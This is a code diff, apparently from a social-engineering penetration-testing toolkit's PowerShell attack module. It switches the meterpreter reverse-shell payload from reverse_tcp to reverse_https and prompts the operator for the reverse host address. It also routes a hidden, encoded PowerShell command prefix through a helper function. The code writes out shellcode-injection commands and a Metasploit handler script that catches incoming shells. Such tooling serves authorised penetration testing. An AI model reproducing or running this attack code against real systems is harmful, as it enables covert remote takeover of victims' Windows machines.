@@ -27,7 +27,8 @@ powershell_menu_choice = input(core.setprompt(["29"], ""))
 
 if powershell_menu_choice != "99":
     # specify ipaddress of reverse listener
-    ipaddr = core.grab_ipaddress()
+    #ipaddr = core.grab_ipaddress()
+    ipaddr = raw_input("Enter the IPAddress or DNS name for the reverse host: ")
     core.update_options("IPADDR=" + ipaddr)
 
     # if we select alphanumeric shellcode
@@ -40,7 +41,7 @@ if powershell_menu_choice != "99":
         core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
         with open(core.setdir + "/payload_options.shellcode", "w") as filewrite:
-            filewrite.write("windows/meterpreter/reverse_tcp {},".format(port))
+            filewrite.write("windows/meterpreter/reverse_https {},".format(port))
 
         try:
             core.module_reload(src.payloads.powershell.prep)
@@ -56,7 +57,7 @@ if powershell_menu_choice != "99":
         # here we format everything for us
         with  open(core.setdir + "/x86.powershell") as fileopen:
             x86 = fileopen.read()
-        x86 = "powershell -nop -window hidden -noni -EncodedCommand " + x86
+        x86 = core.powershell_encodedcommand() + x86
         core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir, "reports/powershell/")))
         with open(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w") as filewrite:
             filewrite.write(x86)
@@ -69,7 +70,7 @@ if powershell_menu_choice != "99":
         if choice == 'YES':
             with open(core.setdir + "/reports/powershell/powershell.rc", "w") as filewrite:
                 filewrite.write("use multi/handler\n"
-                                "set payload windows/meterpreter/reverse_tcp\n"
+                                "set payload windows/meterpreter/reverse_https\n"
                                 "set LPORT {0}\n"
                                 "set LHOST 0.0.0.0\n"
                                 "set ExitOnSession false\n"
